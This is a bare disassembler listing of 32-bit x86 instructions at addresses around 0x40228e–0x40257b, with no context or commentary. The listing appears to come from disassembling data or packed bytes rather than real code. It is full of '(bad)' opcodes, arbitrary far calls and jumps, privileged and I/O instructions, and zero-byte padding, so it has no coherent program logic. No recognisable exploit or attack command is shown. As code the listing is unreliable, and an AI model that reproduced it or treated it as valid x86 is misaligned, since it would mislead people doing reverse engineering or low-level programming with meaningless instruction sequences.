  40228e:	push   esp
  40228f:	cdq    
  402290:	call   0x7048:0x1004870
  402297:	mov    eax,ds:0x4834a2
  40229c:	add    DWORD PTR [eax+0x34],ecx
  40229f:	test   eax,0x4870aa
  4022a4:	add    DWORD PTR [eax+0x70],ecx
  4022a7:	mov    cl,0xb2
  4022a9:	xor    al,0x48
  4022ab:	add    BYTE PTR [ecx],al
  4022ad:	dec    eax
  4022ae:	xor    al,0xb9
  4022b0:	mov    WORD PTR [ebp-0x255d3cef],?
  4022b6:	mov    esp,0x91094dc7
  4022bb:	mov    al,bh
  4022bd:	adc    dh,BYTE PTR [eax+eax*1-0x74]
  4022c1:	jge    0x402317
  4022c3:	mov    al,BYTE PTR [ebp+0x42207b21]
  4022c9:	(bad)  
  4022ca:	je     0x4022cb
  4022cc:	add    DWORD PTR [ecx+0x3b],esp
  4022cf:	mov    BYTE PTR [eax-0x6b],ah
  4022d2:	pop    ebp
  4022d3:	mov    edx,DWORD PTR [edx-0x49]
  4022d6:	and    BYTE PTR [ebx-0x7724cf40],dh
  4022dc:	add    DWORD PTR [eax],edi
  4022de:	inc    ebp
  4022df:	mov    ecx,DWORD PTR ds:0xa9af3b00
  4022e5:	adc    ebx,DWORD PTR [ecx+0x5c]
  4022e8:	fsub   QWORD PTR [ecx-0x34b20e4d]
  4022ee:	clc    
  4022ef:	mov    eax,DWORD PTR [ecx]
  4022f1:	dec    eax
  4022f2:	mov    cl,0xac
  4022f4:	popa   
  4022f5:	test   eax,0x8776f8c3
  4022fa:	popf   
  4022fb:	and    BYTE PTR ds:0xc6e90cbd,al
  402301:	sbb    BYTE PTR [eax],al
  402303:	add    BYTE PTR [ecx],al
  402305:	mov    ebp,DWORD PTR [eax-0x73]
  402308:	jle    0x402322
  40230a:	mov    eax,DWORD PTR [eax]
  40230c:	or     eax,0xa9ae3b00
  402311:	adc    ecx,DWORD PTR [ebp+0x4102b500]
  402317:	add    eax,0x4004cedc
  40231c:	or     al,0x2e
  40231e:	stos   DWORD PTR es:[edi],eax
  40231f:	sub    bh,BYTE PTR [eax-0x6f0c5a9c]
  402325:	inc    eax
  402326:	sub    al,0x79
  402328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402329:	dec    esp
  40232a:	shl    DWORD PTR [ebx-0x33],0x83
  40232e:	pusha  
  40232f:	ret    
  402330:	imul   esp,DWORD PTR [eax+eax*1],0xd2310120
  402337:	add    ch,BYTE PTR [ebx-0x64]
  40233a:	cmp    edi,edi
  40233c:	test   eax,0x8dd8e114
  402341:	fsub   st,st(3)
  402343:	add    BYTE PTR [eax+0x74],ah
  402346:	pop    ss
  402347:	jo     0x402382
  402349:	inc    edi
  40234a:	retf   
  40234b:	or     BYTE PTR [eax+0x11cc3c0],dh
  402351:	rol    BYTE PTR ds:0x4684b54b,0x54
  402358:	add    BYTE PTR [ecx-0x6a41b3ac],bh
  40235e:	mov    dh,BYTE PTR [esi-0x626a754f]
  402364:	call   0x4d24:0x351db91
  40236b:	cmc    
  40236c:	push   ecx
  40236d:	xchg   ebp,eax
  40236e:	popa   
  40236f:	ret    
  402370:	mov    ds:0xf25449ea,al
  402375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402376:	sbb    cl,BYTE PTR [edx-0x33861654]
  40237c:	and    al,0x0
  40237e:	xchg   dh,al
  402380:	std    
  402381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402382:	mov    ebx,DWORD PTR [eax+esi*2]
  402385:	add    DWORD PTR ds:0x6130d425,ebp
  40238b:	xchg   BYTE PTR [esp+edx*1+0x50],al
  40238f:	add    cl,dh
  402391:	sub    DWORD PTR [esi],esp
  402393:	jp     0x402354
  402395:	push   edx
  402396:	cmp    al,0x46
  402398:	jmp    0x1442488
  40239d:	pop    edx
  40239e:	call   0x723c17bb
  4023a3:	enter  0x5ef4,0xa0
  4023a7:	jbe    0x402424
  4023a9:	pop    ebx
  4023aa:	add    BYTE PTR [edi+0x58],ah
  4023ad:	or     BYTE PTR [edi+0x26],bl
  4023b0:	gs add al,bh
  4023b3:	retf   0x88bc
  4023b6:	icebp  
  4023b7:	sbb    eax,0xb63e6540
  4023bc:	cdq    
  4023bd:	cwde   
  4023be:	dec    ebx
  4023bf:	out    0xed,al
  4023c1:	popa   
  4023c2:	dec    edx
  4023c3:	cmp    esp,DWORD PTR [ebp+0x16f8a81]
  4023c9:	push   0x741bab60
  4023ce:	or     BYTE PTR cs:0x12040743,cl
  4023d5:	daa    
  4023d6:	xchg   edx,eax
  4023d7:	cmp    eax,0x16947a50
  4023dc:	jl     0x402372
  4023de:	jp     0x402431
  4023e0:	push   esp
  4023e1:	jp     0x402377
  4023e3:	jl     0x40241f
  4023e5:	stos   BYTE PTR es:[edi],al
  4023e6:	test   DWORD PTR [eax+0x2],ebp
  4023e9:	outs   dx,BYTE PTR ds:[esi]
  4023ea:	push   ds
  4023eb:	sub    ecx,DWORD PTR [edi]
  4023ed:	adc    bl,BYTE PTR [ecx]
  4023ef:	sbb    DWORD PTR [ebx],eax
  4023f1:	and    esi,DWORD PTR [esi]
  4023f3:	xchg   edi,eax
  4023f4:	test   eax,0xc9b6d758
  4023f9:	or     al,bh
  4023fb:	add    eax,0x66cb9a05
  402400:	bound  edx,QWORD PTR [esi]
  402402:	xchg   ebp,eax
  402403:	add    DWORD PTR [eax-0x59],ebx
  402406:	push   es
  402407:	push   ebx
  402408:	add    eax,0xbf5a5f3a
  40240d:	and    DWORD PTR [edx+0x50],ebp
  402410:	add    DWORD PTR [ebx-0x45933e6],ecx
  402416:	cdq    
  402417:	add    BYTE PTR [ecx],al
  402419:	adc    ch,BYTE PTR [ebp-0x5b66a27a]
  40241f:	inc    edi
  402420:	retf   
  402421:	bound  ebx,QWORD PTR [eax-0x2c]
  402424:	repnz push edx
  402426:	jbe    0x40240b
  402428:	ret    
  402429:	call   0x1b4f280
  40242e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40242f:	call   FWORD PTR [eax-0x59]
  402432:	sub    DWORD PTR [edi],eax
  402434:	leave  
  402435:	loop   0x4023d2
  402437:	push   esp
  402438:	pop    eax
  402439:	adc    dh,BYTE PTR [esp+eiz*8]
  40243c:	ja     0x402493
  40243e:	sar    bh,1
  402440:	pop    esi
  402441:	lea    eax,[ebp-0x12]
  402444:	hlt    
  402445:	test   DWORD PTR [ecx-0x2fdf332c],ecx
  40244b:	ficomp WORD PTR [eax+edx*1+0x24]
  40244f:	inc    esp
  402450:	add    DWORD PTR [eax],eax
  402452:	add    BYTE PTR [eax+0x69],ch
  402455:	add    BYTE PTR [eax],al
  402457:	add    ah,al
  402459:	xor    si,si
  40245c:	xchg   ecx,eax
  40245d:	mov    DWORD PTR [ebx],ebp
  40245f:	cdq    
  402460:	cmp    eax,0xe255dce0
  402465:	adc    ah,BYTE PTR [ebp+0x640a6ee7]
  40246b:	rol    BYTE PTR [ecx],1
  40246d:	sti    
  40246e:	out    dx,eax
  40246f:	arpl   dx,dx
  402471:	adc    ebp,DWORD PTR [edi-0x1]
  402474:	mov    DWORD PTR [ebp+0x75],esi
  402477:	sub    BYTE PTR [ebp-0x13],cl
  40247a:	dec    ebx
  40247b:	and    eax,0x24523716
  402480:	jns    0x40241b
  402482:	jmp    0x4024fa
  402484:	loop   0x402499
  402486:	dec    ebp
  402487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402488:	xchg   ecx,eax
  402489:	sar    DWORD PTR [ecx+edx*4+0x554b0b6d],cl
  402490:	jno    0x40250c
  402492:	sub    esp,ebx
  402494:	ret    
  402495:	sub    eax,DWORD PTR [ecx]
  402497:	mov    dh,0x21
  402499:	call   FWORD PTR [ecx-0x6bdbb010]
  40249f:	mov    BYTE PTR [edi+0x0],ch
  4024a2:	jge    0x40243f
  4024a4:	adc    DWORD PTR [eax],eax
  4024a6:	aas    
  4024a7:	outs   dx,BYTE PTR ds:[esi]
  4024a8:	imul   ebp,DWORD PTR [eax-0x5a63efab],0x7e
  4024af:	in     al,dx
  4024b0:	jmp    0x8ccc1535
  4024b5:	cld    
  4024b6:	imul   eax,DWORD PTR [eax],0xdcfc6806
  4024bc:	add    edi,edi
  4024be:	push   ebp
  4024bf:	and    DWORD PTR [ebx+0x55],ecx
  4024c2:	xchg   edi,eax
  4024c3:	rol    DWORD PTR [ecx+0x6e000068],cl
  4024c9:	push   0x0
  4024cb:	push   0x68
  4024cd:	push   0x8001036a
  4024d2:	aas    
  4024d3:	(bad)  
  4024d4:	test   eax,0xc1c40173
  4024d9:	and    BYTE PTR [edx*2-0x4a66f3c],0x2e
  4024e1:	mov    ds:0x5ec06144,eax
  4024e6:	(bad)  
  4024e7:	aam    0x4a
  4024e9:	jno    0x40251d
  4024eb:	into   
  4024ec:	bound  esp,QWORD PTR [ebp+0x76]
  4024ef:	aam    0x1e
  4024f1:	sbb    edx,DWORD PTR [ecx-0x7c]
  4024f4:	sub    ebp,DWORD PTR [ebp+0x52]
  4024f7:	pop    edi
  4024f8:	lds    edx,FWORD PTR [edx+0x27b3bc5d]
  4024fe:	dec    esi
  4024ff:	xchg   DWORD PTR [ecx+0x6e],ecx
  402502:	mov    eax,0xadfbd425
  402507:	jns    0x4024be
  402509:	xchg   ebx,eax
  40250a:	adc    DWORD PTR [esi],esi
  40250c:	sub    al,0x8f
  40250e:	xchg   edx,eax
  40250f:	lea    esi,[eax-0x5c713a9c]
  402515:	cmp    ch,dh
  402517:	aas    
  402518:	adc    al,0xa6
  40251a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40251b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40251c:	lea    esp,[edi-0x3ad51cf8]
  402522:	add    al,0xd7
  402524:	jnp    0x4024e3
  402526:	push   ds
  402527:	clc    
  402528:	xchg   DWORD PTR [ebx+0x12602],edx
  40252e:	add    BYTE PTR [edi+0x1],dh
  402534:	add    DWORD PTR [eax],eax
  402536:	add    BYTE PTR [eax],al
  402538:	add    DWORD PTR [eax],eax
  40253a:	add    BYTE PTR [eax],al
  40253c:	add    DWORD PTR [eax],eax
  40253e:	add    BYTE PTR [eax],al
  402540:	add    DWORD PTR [eax],eax
  402542:	add    BYTE PTR [eax],al
  402544:	add    DWORD PTR [edx+0x72],ebp
  402547:	add    BYTE PTR [ecx],al
  402549:	jb     0x402595
  40254b:	add    eax,0x42004
  402550:	add    DWORD PTR [edi+0x7b27347b],eax
  402556:	add    DWORD PTR [eax],0x76
  402559:	xor    al,0x7b
  40255b:	xchg   ebx,eax
  40255c:	mov    esp,0x39b517c1
  402561:	imul   edi,DWORD PTR [edi+0x44],0xb3323076
  402568:	loop   0x40253c
  40256a:	push   eax
  40256b:	hlt    
  40256c:	and    al,0x6e
  40256e:	lock daa 
  402570:	xor    ch,cl
  402572:	sbb    DWORD PTR [ebx-0x4],ebx
  402575:	clc    
  402576:	imul   ecx,DWORD PTR [ebx+edx*2],0x77
  40257a:	pop    ebp
  40257b:	inc    ebp
